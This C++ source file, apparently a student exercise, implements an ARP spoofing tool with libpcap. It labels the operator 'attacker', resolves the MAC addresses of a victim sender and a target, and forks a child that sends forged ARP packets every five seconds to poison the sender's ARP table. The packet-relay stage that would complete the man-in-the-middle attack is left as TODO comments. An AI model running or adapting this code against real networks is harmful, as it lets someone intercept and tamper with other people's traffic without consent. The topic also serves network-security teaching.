#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/types.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp-spoof.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc %2  != 0 ) {
		usage();
		return -1;
	}

	Mac attackerMac, senderMac, targetMac;
	Ip attackerIp, senderIp, targetIp;

	string interface = argv[1];

	cout << "Getting Attacker Info...\n" ;
	getAttackerInfo(interface, attackerMac, attackerIp);
	cout << "Attacker MAC Address: " << string(attackerMac) << "\n";
	cout << "Attacker IP Address: " << string(attackerIp) << "\n";
	cout << "\n=============================================\n\n";
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=1; i< argc/2 ; i++) {
		senderIp = Ip(argv[i*2]);
		cout <<"Setting Sender IP to: " << argv[i*2] << "\n";
		targetIp = Ip(argv[i*2 +1]);
		cout << "Setting Target IP to: " << argv[i*2+1] << "\n";
		cout << "\nGetting Sender MAC Address...\n";
		getMACAddress(handle, senderMac, senderIp, attackerMac, attackerIp);
		cout << "Sender MAC Address: " << string(senderMac) << "\n";
		cout << "\nGetting Target MAC Address...\n";
		getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
		cout << "Target MAC Address: " << string(targetMac) << "\n";

		// Create Child Process to Continuously Infect ARP Table of Sender
		pid_t pid = fork();
		if (pid <0) {
			cout << "Fork Failed!\n";
			return -1;
		}
		else if (pid == 0) {
			while(true) { 
				cout << "Infecting ARP Table of Sender...\n";
				sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
				sleep(5); //every 5 seconds
			}
		}
		else {
			while (true) {
				//Parent Process Continuously listens for Sender's packets
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(handle, &header, &packet);
				if (res == 0 || packet== NULL ) continue;
				if (res == -1 || res == -2) {
					cout << "PCAP ERROR!\n";
					break;
				}

				EthHdr* ethHdr = (EthHdr*)packet;
				printf("Packet Recieved!\n");
				// Todo:
				// 1. if packet is not from sender, continue
				// 2. if packet is a arp request broadcast looking for target's mac, infect sender's arp table
				// 3. if it is an ip packet from sender to target, relay the packet to target

			}
		}
		//Todo: functional programming
		cout << "\n=============================================\n\n";

	}
	pcap_close(handle);
}
